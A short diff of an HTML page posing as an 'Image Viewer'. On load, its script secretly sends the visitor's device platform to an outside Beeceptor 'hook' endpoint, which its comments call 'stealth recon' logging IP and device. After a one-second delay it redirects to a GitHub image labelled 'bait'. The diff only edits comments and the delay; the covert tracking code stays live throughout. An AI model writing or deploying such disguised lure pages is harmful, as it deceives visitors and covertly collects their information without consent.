@@ -4,17 +4,17 @@
     <title>Image Viewer</title>
     <script>
         function runPayload() {
-            // YOUR ACTIVE BEECEPTOR ENDPOINT
+            // YOUR NEW ACTIVE BEECEPTOR ENDPOINT FROM SCREENSHOT
             const hook = "https://bluekama-project.free.beeceptor.com";
             const bait = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // THE STEALTH RECON (Logs IP and Device)
+            // THE STEALTH RECON (Logs IP and Device to Beeceptor)
             navigator.sendBeacon(hook + "/landed?device=" + navigator.platform);
 
-            // THE REDIRECT (Sends them to the image after 1.2s)
+            // THE REDIRECT (Sends them to the image)
             setTimeout(function() {
                 window.location.href = bait;
-            }, 1200);
+            }, 1000);
         }
         window.onload = runPayload;
     </script>
